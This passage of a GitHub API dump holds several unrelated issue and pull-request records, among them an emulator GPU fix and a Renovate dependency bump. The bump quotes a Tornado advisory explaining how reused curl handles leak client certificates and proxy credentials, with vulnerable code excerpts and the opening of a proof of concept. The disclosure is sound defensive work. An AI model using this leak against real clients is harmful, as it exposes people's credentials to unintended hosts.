kiểm rằng khoá/token không lọt vào log, repr hay lỗi.\n\n---\n_Generated by [Claude Code](https://claude.ai/code/session_01HbtEKFbUeqjk2t8rLo5oSp)_","reactions":{"url":"https://api.github.com/repos/pichu124/Future-trading/issues/1/reactions","total_count":0,"+1":0,"-1":0,"laugh":0,"hooray":0,"confused":0,"heart":0,"rocket":0,"eyes":0},"timeline_url":"https://api.github.com/repos/pichu124/Future-trading/issues/1/timeline","performed_via_github_app":{"id":1236702,"client_id":"Iv23liqTIFEtdIu6Vn1r","slug":"claude","node_id":"A_kwHOBIuudM4AEt7e","owner":{"login":"anthropics","id":76263028,"node_id":"MDEyOk9yZ2FuaXphdGlvbjc2MjYzMDI4","avatar_url":"https://avatars.githubusercontent.com/u/76263028?v=4","gravatar_id":"","url":"https://api.github.com/users/anthropics","html_url":"https://github.com/anthropics","followers_url":"https://api.github.com/users/anthropics/followers","following_url":"https://api.github.com/users/anthropics/following{/other_user}","gists_url":"https://api.github.com/users/anthropics/gists{/gist_id}","starred_url":"https://api.github.com/users/anthropics/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/anthropics/subscriptions","organizations_url":"https://api.github.com/users/anthropics/orgs","repos_url":"https://api.github.com/users/anthropics/repos","events_url":"https://api.github.com/users/anthropics/events{/privacy}","received_events_url":"https://api.github.com/users/anthropics/received_events","type":"Organization","user_view_type":"public","site_admin":false},"name":"Claude","description":"Run Claude Code from your GitHub Pull Requests and Issues to respond to reviewer feedback, fix CI errors, or modify code, turning it into a virtual teammate that works alongside your development pipelines.\r\n\r\nThis is built on the publicly available Claude Code SDK.","external_url":"https://anthropic.com/claude-code","html_url":"https://github.com/apps/claude","created_at":"2025-04-30T17:54:24Z","updated_at":"2026-11-06T04:29:41Z","permissions":{"actions":"write","administration":"read","checks":"write","contents":"write","discussions":"write","issues":"write","members":"read","merge_queues":"read","metadata":"read","pull_requests":"write","repository_creation":"write","repository_hooks":"write","statuses":"read","workflows":"write"},"events":["branch_protection_rule","check_run","check_suite","commit_comment","discussion","discussion_comment","issues","issue_comment","merge_group","merge_queue_entry","pull_request","pull_request_review","pull_request_review_comment","pull_request_review_thread","push","release","repository_ruleset","status","sub_issues"]},"state_reason":null,"score":1.0},{"url":"https://api.github.com/repos/Alef-Keuffer/qmde/issues/27","repository_url":"https://api.github.com/repos/Alef-Keuffer/qmde","labels_url":"https://api.github.com/repos/Alef-Keuffer/qmde/issues/27/labels{/name}","comments_url":"https://api.github.com/repos/Alef-Keuffer/qmde/issues/27/comments","events_url":"https://api.github.com/repos/Alef-Keuffer/qmde/issues/27/events","html_url":"https://github.com/Alef-Keuffer/qmde/pull/27","id":6311492355,"node_id":"PR_kwDOU27U3s8AAAABOKOzlQ","number":27,"title":"emf: cite the reference next to every rule, at equation level (#24)","user":{"login":"Alef-Keuffer","id":56977642,"node_id":"MDQ6VXNlcjU2OTc3NjQy","avatar_url":"https://avatars.githubusercontent.com/u/56977642?v=4","gravatar_id":"","url":"https://api.github.com/users/Alef-Keuffer","html_url":"https://github.com/Alef-Keuffer","followers_url":"https://api.github.com/users/Alef-Keuffer/followers","following_url":"https://api.github.com/users/Alef-Keuffer/following{/other_user}","gists_url":"https://api.github.com/users/Alef-Keuffer/gists{/gist_id}","starred_url":"https://api.github.com/users/Alef-Keuffer/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/Alef-Keuffer/subscriptions","organizations_url":"https://api.github.com/users/Alef-Keuffer/orgs","repos_url":"https://api.github.com/users/Alef-Keuffer/repos","events_url":"https://api.github.com/users/Alef-Keuffer/events{/privacy}","received_events_url":"https://api.github.com/users/Alef-Keuffer/received_events","type":"User","user_view_type":"public","site_admin":false},"labels":[],"state":"closed","locked":false,"assignees":[],"milestone":null,"comments":0,"created_at":"2026-11-10T16:48:24Z","updated_at":"2026-11-10T17:36:28Z","closed_at":"2026-11-10T17:36:28Z","assignee":null,"author_association":"OWNER","active_lock_reason":null,"draft":false,"pull_request":{"url":"https://api.github.com/repos/Alef-Keuffer/qmde/pulls/27","html_url":"https://github.com/Alef-Keuffer/qmde/pull/27","diff_url":"https://github.com/Alef-Keuffer/qmde/pull/27.diff","patch_url":"https://github.com/Alef-Keuffer/qmde/pull/27.patch","merged_at":"2026-11-10T17:36:28Z"},"body":"Closes #24\n\n## Summary\n\nEvery rule and formulation step cites what it implements as `[Key locator]`, with Key one of Paper, Notebook, Farhi, Lucas or Glover. Departures from the paper cite their ADR. Comments only, plus one Glossary entry.\n\n```diff\n transforms/problem2conflictgraph.atl\n-  [Paper §3.2, Eq. (4)]: batches k = 1..M bound the schedule.\n+  [Paper §5.3, Eq. (4)]: X has only M columns, so the M batches bound the schedule.\n+  Exam2Exam [Paper §5.2, Fig. 3], NewBatch [Paper §5.3, Eq. (4)], Conflict [Paper §5.2, Algorithm 1, Eq. (3)]\n codegen/main.mtl (and so every generated solve_<name>.py)\n-  # Each exam should be scheduled at most once\n+  # [Glover §4, known penalties, row 5] [Lucas §4.2, Eq. (30)]: each exam in at most one batch,\n+  # the paper's exactly-one [Paper §5.3, Eqs. (5)-(7)] relaxed (ADR-0009)\n+  conflicts [Paper §5.3, Eqs. (8)-(9)], profit [Glover §4.2] [Lucas §4.2, Eq. (31)], H [Paper §5.3, Eq. (10)]\n python/examschedule.py\n+  QAOA: |s> [Farhi Eq. (5)], p layers (6), cost layer (2), mixer (3)-(4), F_p (7), classical loop (8)\n+  Ising form [Lucas §2.3, Eq. (12)], [Lucas §1.1, Eq. (4)]; automatic Penalty Coefficient [Lucas §4.2] [Glover §4]\n GLOSSARY.md\n+  Simulated Annealing, Avoid: quantum annealing (#23)\n```\n\nThe old citations put Algorithm 1 and Eq. (4) in the paper's §3.2. They are in §5.2 and §5.3.\n\n## Evidence\n\n- **Before:** `NewBatch` and `Exam2Exam` cited nothing. The formulation sections of `main.mtl` cited only \"the notebook's formulation\".\n  **After:** every ATL rule, template section and QAOA step carries a `[Key locator]`. #29 generates the report's Appendix A (rule to reference) from these comments.\n- CI on this PR: emf ([42858452878](https://github.com/Alef-Keuffer/qmde/actions/runs/42858452878): `./build.sh` on every instance, 4 + 4 unit tests OK) and emf-ide ([42858452672](https://github.com/Alef-Keuffer/qmde/actions/runs/42858452672): no problems in a fresh Eclipse workspace) both passed.\n\n## Merge Danger\n\n**Door:** two-way\n\n**Blast Radius:** comments\n\nNo code changes. The generated scripts get new comments, and their code is unchanged.\n\n---\n\n<sub>Stack created with <a href=\"https://github.com/github/gh-stack\">GitHub Stacks CLI</a> • <a href=\"https://gh.io/stacks-feedback\">Give Feedback 💬</a></sub>\n","reactions":{"url":"https://api.github.com/repos/Alef-Keuffer/qmde/issues/27/reactions","total_count":0,"+1":0,"-1":0,"laugh":0,"hooray":0,"confused":0,"heart":0,"rocket":0,"eyes":0},"timeline_url":"https://api.github.com/repos/Alef-Keuffer/qmde/issues/27/timeline","performed_via_github_app":null,"state_reason":null,"score":1.0},{"url":"https://api.github.com/repos/scarletnx/ScarletNX/issues/1547","repository_url":"https://api.github.com/repos/scarletnx/ScarletNX","labels_url":"https://api.github.com/repos/scarletnx/ScarletNX/issues/1547/labels{/name}","comments_url":"https://api.github.com/repos/scarletnx/ScarletNX/issues/1547/comments","events_url":"https://api.github.com/repos/scarletnx/ScarletNX/issues/1547/events","html_url":"https://github.com/scarletnx/ScarletNX/pull/1547","id":6306281447,"node_id":"PR_kwDOVETn8s8AAAABOGCbJg","number":1547,"title":"[vk] No subgroups in Turnip's geometry stage, no GPU profile on MoltenVK","user":{"login":"DraChimeraVee","id":265363427,"node_id":"U_kgDOD9Ef4w","avatar_url":"https://avatars.githubusercontent.com/u/265363427?v=4","gravatar_id":"","url":"https://api.github.com/users/DraChimeraVee","html_url":"https://github.com/DraChimeraVee","followers_url":"https://api.github.com/users/DraChimeraVee/followers","following_url":"https://api.github.com/users/DraChimeraVee/following{/other_user}","gists_url":"https://api.github.com/users/DraChimeraVee/gists{/gist_id}","starred_url":"https://api.github.com/users/DraChimeraVee/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/DraChimeraVee/subscriptions","organizations_url":"https://api.github.com/users/DraChimeraVee/orgs","repos_url":"https://api.github.com/users/DraChimeraVee/repos","events_url":"https://api.github.com/users/DraChimeraVee/events{/privacy}","received_events_url":"https://api.github.com/users/DraChimeraVee/received_events","type":"User","user_view_type":"public","site_admin":false},"labels":[{"id":12632644528,"node_id":"LA_kwDOVETn8s8AAAAC8PbbsA","url":"https://api.github.com/repos/scarletnx/ScarletNX/labels/kind:%20bug","name":"kind: bug","color":"d73a4a","default":false,"description":"Something does not work","archived_at":null,"archived_by":null},{"id":12673644249,"node_id":"LA_kwDOVETn8s8AAAAC82h22Q","url":"https://api.github.com/repos/scarletnx/ScarletNX/labels/priority:%20medium","name":"priority: medium","color":"fbca04","default":false,"description":"Planned","archived_at":null,"archived_by":null},{"id":12673645035,"node_id":"LA_kwDOVETn8s8AAAAC82h56w","url":"https://api.github.com/repos/scarletnx/ScarletNX/labels/preview-effort:%20small","name":"preview-effort: small","color":"d4c5f9","default":false,"description":"A contained change","archived_at":null,"archived_by":null},{"id":12798034603,"node_id":"LA_kwDOVETn8s8AAAAC-tKCqw","url":"https://api.github.com/repos/scarletnx/ScarletNX/labels/area:%20gpu","name":"area: gpu","color":"1d76db","default":false,"description":null,"archived_at":null,"archived_by":null}],"state":"closed","locked":false,"assignees":[{"login":"DraChimeraVee","id":265363427,"node_id":"U_kgDOD9Ef4w","avatar_url":"https://avatars.githubusercontent.com/u/265363427?v=4","gravatar_id":"","url":"https://api.github.com/users/DraChimeraVee","html_url":"https://github.com/DraChimeraVee","followers_url":"https://api.github.com/users/DraChimeraVee/followers","following_url":"https://api.github.com/users/DraChimeraVee/following{/other_user}","gists_url":"https://api.github.com/users/DraChimeraVee/gists{/gist_id}","starred_url":"https://api.github.com/users/DraChimeraVee/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/DraChimeraVee/subscriptions","organizations_url":"https://api.github.com/users/DraChimeraVee/orgs","repos_url":"https://api.github.com/users/DraChimeraVee/repos","events_url":"https://api.github.com/users/DraChimeraVee/events{/privacy}","received_events_url":"https://api.github.com/users/DraChimeraVee/received_events","type":"User","user_view_type":"public","site_admin":false}],"milestone":null,"comments":0,"created_at":"2026-11-10T11:55:25Z","updated_at":"2026-11-10T17:33:10Z","closed_at":"2026-11-10T17:33:08Z","assignee":{"login":"DraChimeraVee","id":265363427,"node_id":"U_kgDOD9Ef4w","avatar_url":"https://avatars.githubusercontent.com/u/265363427?v=4","gravatar_id":"","url":"https://api.github.com/users/DraChimeraVee","html_url":"https://github.com/DraChimeraVee","followers_url":"https://api.github.com/users/DraChimeraVee/followers","following_url":"https://api.github.com/users/DraChimeraVee/following{/other_user}","gists_url":"https://api.github.com/users/DraChimeraVee/gists{/gist_id}","starred_url":"https://api.github.com/users/DraChimeraVee/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/DraChimeraVee/subscriptions","organizations_url":"https://api.github.com/users/DraChimeraVee/orgs","repos_url":"https://api.github.com/users/DraChimeraVee/repos","events_url":"https://api.github.com/users/DraChimeraVee/events{/privacy}","received_events_url":"https://api.github.com/users/DraChimeraVee/received_events","type":"User","user_view_type":"public","site_admin":false},"author_association":"CONTRIBUTOR","issue_field_values":[],"type":null,"active_lock_reason":null,"draft":false,"pull_request":{"url":"https://api.github.com/repos/scarletnx/ScarletNX/pulls/1547","html_url":"https://github.com/scarletnx/ScarletNX/pull/1547","diff_url":"https://github.com/scarletnx/ScarletNX/pull/1547.diff","patch_url":"https://github.com/scarletnx/ScarletNX/pull/1547.patch","merged_at":"2026-11-10T17:33:07Z"},"body":"Fixes #1002, fixes #711\n\n- Keep subgroup operations out of Turnip's geometry stage: a ban table line (`VK_SHADER_STAGE_GEOMETRY_BIT`, off on Turnip) takes the stage out of the ones the translator gives subgroup operations, as Turnip lists it and gives wrong ballot and shuffle results there (Eden PR 4344). `vulkan_ban_ignore=VK_SHADER_STAGE_GEOMETRY_BIT` tests a newer Turnip again.\n- Run vk_gpu_profile as 0 on a portability driver (one that lists VK_KHR_portability_subset): the warning says the value asked for and the one in effect, and points at `MTL_HUD_ENABLED=1` and Instruments' Metal System Trace.\n\nvk_extension_bans has the Turnip cases; vk_gpuprof_setting is new. Neither rule ran on a Turnip or MoltenVK device. Tracy's GPU track and the stats box still write timestamps on a portability driver, and KosmicKrisp is not checked.\n","reactions":{"url":"https://api.github.com/repos/scarletnx/ScarletNX/issues/1547/reactions","total_count":0,"+1":0,"-1":0,"laugh":0,"hooray":0,"confused":0,"heart":0,"rocket":0,"eyes":0},"timeline_url":"https://api.github.com/repos/scarletnx/ScarletNX/issues/1547/timeline","performed_via_github_app":null,"state_reason":null,"score":1.0},{"url":"https://api.github.com/repos/scarletnx/ScarletNX/issues/711","repository_url":"https://api.github.com/repos/scarletnx/ScarletNX","labels_url":"https://api.github.com/repos/scarletnx/ScarletNX/issues/711/labels{/name}","comments_url":"https://api.github.com/repos/scarletnx/ScarletNX/issues/711/comments","events_url":"https://api.github.com/repos/scarletnx/ScarletNX/issues/711/events","html_url":"https://github.com/scarletnx/ScarletNX/issues/711","id":6016770191,"node_id":"I_kwDOVETn8s8AAAABZqCgjw","number":711,"title":"[vk] vk_gpu_profile makes MoltenVK about 10 times slower, and its timestamps are unreliable there","user":{"login":"odntht","id":18327034,"node_id":"MDQ6VXNlcjE4MzI3MDM0","avatar_url":"https://avatars.githubusercontent.com/u/18327034?v=4","gravatar_id":"","url":"https://api.github.com/users/odntht","html_url":"https://github.com/odntht","followers_url":"https://api.github.com/users/odntht/followers","following_url":"https://api.github.com/users/odntht/following{/other_user}","gists_url":"https://api.github.com/users/odntht/gists{/gist_id}","starred_url":"https://api.github.com/users/odntht/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/odntht/subscriptions","organizations_url":"https://api.github.com/users/odntht/orgs","repos_url":"https://api.github.com/users/odntht/repos","events_url":"https://api.github.com/users/odntht/events{/privacy}","received_events_url":"https://api.github.com/users/odntht/received_events","type":"User","user_view_type":"public","site_admin":false},"labels":[{"id":12632644528,"node_id":"LA_kwDOVETn8s8AAAAC8PbbsA","url":"https://api.github.com/repos/scarletnx/ScarletNX/labels/kind:%20bug","name":"kind: bug","color":"d73a4a","default":false,"description":"Something does not work","archived_at":null,"archived_by":null},{"id":12673644441,"node_id":"LA_kwDOVETn8s8AAAAC82h3mQ","url":"https://api.github.com/repos/scarletnx/ScarletNX/labels/priority:%20low","name":"priority: low","color":"0e8a16","default":false,"description":"When there is time","archived_at":null,"archived_by":null},{"id":12673645035,"node_id":"LA_kwDOVETn8s8AAAAC82h56w","url":"https://api.github.com/repos/scarletnx/ScarletNX/labels/preview-effort:%20small","name":"preview-effort: small","color":"d4c5f9","default":false,"description":"A contained change","archived_at":null,"archived_by":null},{"id":12798034603,"node_id":"LA_kwDOVETn8s8AAAAC-tKCqw","url":"https://api.github.com/repos/scarletnx/ScarletNX/labels/area:%20gpu","name":"area: gpu","color":"1d76db","default":false,"description":null,"archived_at":null,"archived_by":null},{"id":12811655672,"node_id":"LA_kwDOVETn8s8AAAAC-6JZ-A","url":"https://api.github.com/repos/scarletnx/ScarletNX/labels/platform:%20macos","name":"platform: macos","color":"1d76db","default":false,"description":null,"archived_at":null,"archived_by":null}],"state":"closed","locked":false,"assignees":[{"login":"DraChimeraVee","id":265363427,"node_id":"U_kgDOD9Ef4w","avatar_url":"https://avatars.githubusercontent.com/u/265363427?v=4","gravatar_id":"","url":"https://api.github.com/users/DraChimeraVee","html_url":"https://github.com/DraChimeraVee","followers_url":"https://api.github.com/users/DraChimeraVee/followers","following_url":"https://api.github.com/users/DraChimeraVee/following{/other_user}","gists_url":"https://api.github.com/users/DraChimeraVee/gists{/gist_id}","starred_url":"https://api.github.com/users/DraChimeraVee/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/DraChimeraVee/subscriptions","organizations_url":"https://api.github.com/users/DraChimeraVee/orgs","repos_url":"https://api.github.com/users/DraChimeraVee/repos","events_url":"https://api.github.com/users/DraChimeraVee/events{/privacy}","received_events_url":"https://api.github.com/users/DraChimeraVee/received_events","type":"User","user_view_type":"public","site_admin":false}],"milestone":null,"comments":1,"created_at":"2026-10-24T19:32:30Z","updated_at":"2026-11-10T17:33:10Z","closed_at":"2026-11-10T17:33:10Z","assignee":{"login":"DraChimeraVee","id":265363427,"node_id":"U_kgDOD9Ef4w","avatar_url":"https://avatars.githubusercontent.com/u/265363427?v=4","gravatar_id":"","url":"https://api.github.com/users/DraChimeraVee","html_url":"https://github.com/DraChimeraVee","followers_url":"https://api.github.com/users/DraChimeraVee/followers","following_url":"https://api.github.com/users/DraChimeraVee/following{/other_user}","gists_url":"https://api.github.com/users/DraChimeraVee/gists{/gist_id}","starred_url":"https://api.github.com/users/DraChimeraVee/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/DraChimeraVee/subscriptions","organizations_url":"https://api.github.com/users/DraChimeraVee/orgs","repos_url":"https://api.github.com/users/DraChimeraVee/repos","events_url":"https://api.github.com/users/DraChimeraVee/events{/privacy}","received_events_url":"https://api.github.com/users/DraChimeraVee/received_events","type":"User","user_view_type":"public","site_admin":false},"author_association":"CONTRIBUTOR","issue_field_values":[],"type":{"id":900554333,"node_id":"IT_kwDOFFSu5c41rV5d","name":"Bug","description":"An unexpected problem or behavior","color":"red","created_at":"2026-10-11T18:31:51Z","updated_at":"2026-10-11T18:31:51Z","is_enabled":true},"active_lock_reason":null,"sub_issues_summary":{"total":0,"completed":0,"percent_completed":0},"issue_dependencies_summary":{"blocked_by":0,"total_blocked_by":0,"blocking":0,"total_blocking":0},"body":"Seen on `4aa2d990` (a branch on main `a5ebebff`), iPhone 14 Pro (iOS 26.6.1, MoltenVK).\n\nIn one game's cutscene, `vk_gpu_profile=1` ran at 0.4 to 0.8 fps. With it off, the same scene ran at 6.4 to 7.2 fps. The profile also reported 0 rendering passes in frames that had them.\n\nLikely cause: MoltenVK puts each `vkCmdWriteTimestamp` in a Metal encoder of its own, which waits for the work before it. That gives thousands of extra encoders a frame. Its timestamps are also unreliable on Apple GPUs ([#1585](https://github.com/KhronosGroup/MoltenVK/issues/1585), [#2378](https://github.com/KhronosGroup/MoltenVK/issues/2378)).\n\nIdea: when the device is a portability implementation, keep the profile off and log why. The log can point to `MTL_HUD_ENABLED=1` or Instruments' Metal System Trace instead.\n\nNot checked: macOS with KosmicKrisp.\n","reactions":{"url":"https://api.github.com/repos/scarletnx/ScarletNX/issues/711/reactions","total_count":0,"+1":0,"-1":0,"laugh":0,"hooray":0,"confused":0,"heart":0,"rocket":0,"eyes":0},"timeline_url":"https://api.github.com/repos/scarletnx/ScarletNX/issues/711/timeline","performed_via_github_app":null,"state_reason":"completed","pinned_comment":null,"score":1.0},{"url":"https://api.github.com/repos/smoeberg/EiraOS/issues/148","repository_url":"https://api.github.com/repos/smoeberg/EiraOS","labels_url":"https://api.github.com/repos/smoeberg/EiraOS/issues/148/labels{/name}","comments_url":"https://api.github.com/repos/smoeberg/EiraOS/issues/148/comments","events_url":"https://api.github.com/repos/smoeberg/EiraOS/issues/148/events","html_url":"https://github.com/smoeberg/EiraOS/pull/148","id":6272395283,"node_id":"PR_kwDOTUQm9c8AAAABNrBuSQ","number":148,"title":"feat(rights): HTTPS + mTLS-transport til Fleet Rights API","user":{"login":"smoeberg","id":13792134,"node_id":"MDQ6VXNlcjEzNzkyMTM0","avatar_url":"https://avatars.githubusercontent.com/u/13792134?v=4","gravatar_id":"","url":"https://api.github.com/users/smoeberg","html_url":"https://github.com/smoeberg","followers_url":"https://api.github.com/users/smoeberg/followers","following_url":"https://api.github.com/users/smoeberg/following{/other_user}","gists_url":"https://api.github.com/users/smoeberg/gists{/gist_id}","starred_url":"https://api.github.com/users/smoeberg/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/smoeberg/subscriptions","organizations_url":"https://api.github.com/users/smoeberg/orgs","repos_url":"https://api.github.com/users/smoeberg/repos","events_url":"https://api.github.com/users/smoeberg/events{/privacy}","received_events_url":"https://api.github.com/users/smoeberg/received_events","type":"User","user_view_type":"public","site_admin":false},"labels":[],"state":"closed","locked":false,"assignees":[],"milestone":null,"comments":0,"created_at":"2026-11-08T15:19:26Z","updated_at":"2026-11-10T17:32:34Z","closed_at":"2026-11-08T20:29:43Z","assignee":null,"author_association":"OWNER","active_lock_reason":null,"draft":false,"pull_request":{"url":"https://api.github.com/repos/smoeberg/EiraOS/pulls/148","html_url":"https://github.com/smoeberg/EiraOS/pull/148","diff_url":"https://github.com/smoeberg/EiraOS/pull/148.diff","patch_url":"https://github.com/smoeberg/EiraOS/pull/148.patch","merged_at":"2026-11-08T20:29:43Z"},"body":"Transporten bag den godkendte grænseflade (FLEET-RIGHTS-API §7). Kun standardbiblioteket (`ssl`, `http.client`), ingen nye afhængigheder.\n\n| Krav | Sådan |\n|---|---|\n| Kun den enrollede Fleet | værtsnavnet skal passe; omdirigeringer følges aldrig |\n| Kun Fleets CA | systemets tillidslager indlæses ikke |\n| mTLS | enhedscertifikat fra enroll, TLS ≥ 1.2, tenant-token som Bearer |\n| Afgrænset | 15 s timeout, højst 4 MiB svar |\n\n`eira-rights-apply sync` kører én runde plus heartbeat, med faste exit-koder.\n\n**Tests mod en rigtig TLS-server på localhost** med test-CA: fuld runde med rapport og heartbeat, server fra fremmed CA, enhed uden Fleet-certifikat, gyldigt certifikat til forkert vært, omdirigering, HTTP 500, ikke-JSON, for stort svar, utilgængelig Fleet, header-injektion via token og exit-koder.\n\n**Ikke med:** planlægning (timer/daemon) og enroll-flowet, der efterlader filerne i `/etc/eira/fleet/`.\n\n---\n_Generated by [Claude Code](https://claude.ai/code/session_01C1vfjatg7FrkZw1xgWNoTP)_","reactions":{"url":"https://api.github.com/repos/smoeberg/EiraOS/issues/148/reactions","total_count":0,"+1":0,"-1":0,"laugh":0,"hooray":0,"confused":0,"heart":0,"rocket":0,"eyes":0},"timeline_url":"https://api.github.com/repos/smoeberg/EiraOS/issues/148/timeline","performed_via_github_app":{"id":1236702,"client_id":"Iv23liqTIFEtdIu6Vn1r","slug":"claude","node_id":"A_kwHOBIuudM4AEt7e","owner":{"login":"anthropics","id":76263028,"node_id":"MDEyOk9yZ2FuaXphdGlvbjc2MjYzMDI4","avatar_url":"https://avatars.githubusercontent.com/u/76263028?v=4","gravatar_id":"","url":"https://api.github.com/users/anthropics","html_url":"https://github.com/anthropics","followers_url":"https://api.github.com/users/anthropics/followers","following_url":"https://api.github.com/users/anthropics/following{/other_user}","gists_url":"https://api.github.com/users/anthropics/gists{/gist_id}","starred_url":"https://api.github.com/users/anthropics/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/anthropics/subscriptions","organizations_url":"https://api.github.com/users/anthropics/orgs","repos_url":"https://api.github.com/users/anthropics/repos","events_url":"https://api.github.com/users/anthropics/events{/privacy}","received_events_url":"https://api.github.com/users/anthropics/received_events","type":"Organization","user_view_type":"public","site_admin":false},"name":"Claude","description":"Run Claude Code from your GitHub Pull Requests and Issues to respond to reviewer feedback, fix CI errors, or modify code, turning it into a virtual teammate that works alongside your development pipelines.\r\n\r\nThis is built on the publicly available Claude Code SDK.","external_url":"https://anthropic.com/claude-code","html_url":"https://github.com/apps/claude","created_at":"2025-04-30T17:54:24Z","updated_at":"2026-11-06T04:29:41Z","permissions":{"actions":"write","administration":"read","checks":"write","contents":"write","discussions":"write","issues":"write","members":"read","merge_queues":"read","metadata":"read","pull_requests":"write","repository_creation":"write","repository_hooks":"write","statuses":"read","workflows":"write"},"events":["branch_protection_rule","check_run","check_suite","commit_comment","discussion","discussion_comment","issues","issue_comment","merge_group","merge_queue_entry","pull_request","pull_request_review","pull_request_review_comment","pull_request_review_thread","push","release","repository_ruleset","status","sub_issues"]},"state_reason":null,"score":1.0},{"url":"https://api.github.com/repos/Future-House/ldp/issues/503","repository_url":"https://api.github.com/repos/Future-House/ldp","labels_url":"https://api.github.com/repos/Future-House/ldp/issues/503/labels{/name}","comments_url":"https://api.github.com/repos/Future-House/ldp/issues/503/comments","events_url":"https://api.github.com/repos/Future-House/ldp/issues/503/events","html_url":"https://github.com/Future-House/ldp/pull/503","id":6299408942,"node_id":"PR_kwDOMr5SoM8AAAABOAkg6g","number":503,"title":"Update dependency tornado to v6.6 [SECURITY]","user":{"login":"renovate[bot]","id":29139614,"node_id":"MDM6Qm90MjkxMzk2MTQ=","avatar_url":"https://avatars.githubusercontent.com/in/2740?v=4","gravatar_id":"","url":"https://api.github.com/users/renovate%5Bbot%5D","html_url":"https://github.com/apps/renovate","followers_url":"https://api.github.com/users/renovate%5Bbot%5D/followers","following_url":"https://api.github.com/users/renovate%5Bbot%5D/following{/other_user}","gists_url":"https://api.github.com/users/renovate%5Bbot%5D/gists{/gist_id}","starred_url":"https://api.github.com/users/renovate%5Bbot%5D/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/renovate%5Bbot%5D/subscriptions","organizations_url":"https://api.github.com/users/renovate%5Bbot%5D/orgs","repos_url":"https://api.github.com/users/renovate%5Bbot%5D/repos","events_url":"https://api.github.com/users/renovate%5Bbot%5D/events{/privacy}","received_events_url":"https://api.github.com/users/renovate%5Bbot%5D/received_events","type":"Bot","user_view_type":"public","site_admin":false},"labels":[],"state":"open","locked":false,"assignees":[],"milestone":null,"comments":0,"created_at":"2026-11-10T03:08:49Z","updated_at":"2026-11-10T17:30:55Z","closed_at":null,"assignee":null,"author_association":"CONTRIBUTOR","issue_field_values":[],"type":null,"active_lock_reason":null,"draft":false,"pull_request":{"url":"https://api.github.com/repos/Future-House/ldp/pulls/503","html_url":"https://github.com/Future-House/ldp/pull/503","diff_url":"https://github.com/Future-House/ldp/pull/503.diff","patch_url":"https://github.com/Future-House/ldp/pull/503.patch","merged_at":null},"body":"> [!NOTE]\n> This PR body was truncated due to platform limits.\n\nThis PR contains the following updates:\n\n| Package | Change | [Age](https://docs.renovatebot.com/merge-confidence/) | [Confidence](https://docs.renovatebot.com/merge-confidence/) |\n|---|---|---|---|\n| [tornado](http://www.tornadoweb.org/) ([source](https://redirect.github.com/tornadoweb/tornado)) | `6.5.6` → `6.6` | ![age](https://developer.mend.io/api/mc/badges/age/pypi/tornado/6.6?slim=true) | ![confidence](https://developer.mend.io/api/mc/badges/confidence/pypi/tornado/6.5.6/6.6?slim=true) |\n\n---\n\n### Tornado: CurlAsyncHTTPClient leaks per-request credentials on handle reuse\n[GHSA-pw6j-qg29-8w7f](https://redirect.github.com/advisories/GHSA-pw6j-qg29-8w7f)\n\n<details>\n<summary>More information</summary>\n\n#### Details\n##### CurlAsyncHTTPClient leaks per-request credentials on handle reuse\n\n##### Summary\n\n`CurlAsyncHTTPClient` pools and reuses `pycurl` handles across requests but does\nnot reset them between requests, and several per-request options are applied with\nno clearing branch. As a result, sensitive state set by one request persists onto\na later request on the same client that does not set it. Two credential vectors\nare demonstrated below — a client TLS certificate (`SSLCERT`/`SSLKEY`) and proxy\nbasic-auth credentials (`PROXYUSERPWD`) — both leaking to a different,\nunintended host. This affects all released versions through 6.5.6.\n\n##### Details\n\nIn `tornado/curl_httpclient.py`, handles are created once and returned to a free\nlist for reuse (`_process_queue` pops the handle at line 200, `_finish`\nre-appends it at line 245), and `_curl_setup_request` is never preceded by\n`curl.reset()`. The function clears *some* carried-over state on the reused handle\n— `unsetopt(PROXYUSERPWD)` in the no-proxy branch (line 394), `unsetopt(USERPWD)`\nwhen no auth is set (line 495), and the HTTP-method flag reset (lines 428-432) —\nbut other options have no equivalent clearing path and persist until a later\nrequest sets them again.\n\n**Vector A — client TLS certificate (`SSLCERT`/`SSLKEY`).** Set-only, no clearing\nbranch:\n\n```python\n\n##### tornado/curl_httpclient.py (v6.5.6), lines 498-502\nif request.client_cert is not None:\n    curl.setopt(pycurl.SSLCERT, request.client_cert)\n\nif request.client_key is not None:\n    curl.setopt(pycurl.SSLKEY, request.client_key)\n```\n\nA request that sets `client_cert` leaves the certificate on the handle; a later\nrequest without `client_cert` presents it during its TLS handshake.\n\n**Vector B — proxy credentials (`PROXYUSERPWD`).** `PROXYUSERPWD` is set only\ninside the credentials branch and unset only in the no-proxy `else` branch:\n\n```python\n\n##### tornado/curl_httpclient.py (v6.5.6), lines 371-394\nif request.proxy_host and request.proxy_port:\n    curl.setopt(pycurl.PROXY, request.proxy_host)\n    curl.setopt(pycurl.PROXYPORT, request.proxy_port)\n    if request.proxy_username:                 # only place PROXYUSERPWD is set\n        ...\n        curl.setopt(pycurl.PROXYUSERPWD, credentials)\n    ...\nelse:\n    try:\n        curl.unsetopt(pycurl.PROXY)\n    except TypeError:\n        curl.setopt(pycurl.PROXY, \"\")\n    curl.unsetopt(pycurl.PROXYUSERPWD)         # only place it is unset\n```\n\nA request that sets a *new* `proxy_host` without `proxy_username` updates\n`PROXY`/`PROXYPORT` but never reaches the `else`, so the previous request's\ncredentials persist and are sent to the new proxy.\n\nThe same class also affects `INTERFACE` (lines 365-366: set only when\n`request.network_interface` is truthy, with no clearing branch), which is a\nlower-severity instance — a later request can be bound to a network interface it\ndid not request. A single fix addresses all three (see Mitigation).\n\n##### PoC\n\nBoth reproduce against the pinned release using public API only\n(`CurlAsyncHTTPClient`, `HTTPRequest`, and the documented per-request arguments).\n\n##### Vector A — client TLS certificate\n\nThe two servers listen on different ports, so request B opens a fresh TCP+TLS\nconnection; the certificate can only reach server 2 via the persisted handle\noption, not connection or session reuse.\n\n```\npython3 -m venv venv\n./venv/bin/pip install \"tornado==6.5.6\" pycurl cryptography\n./venv/bin/python poc_client_cert.py\n```\n\n```python\nimport asyncio\nimport datetime\nimport 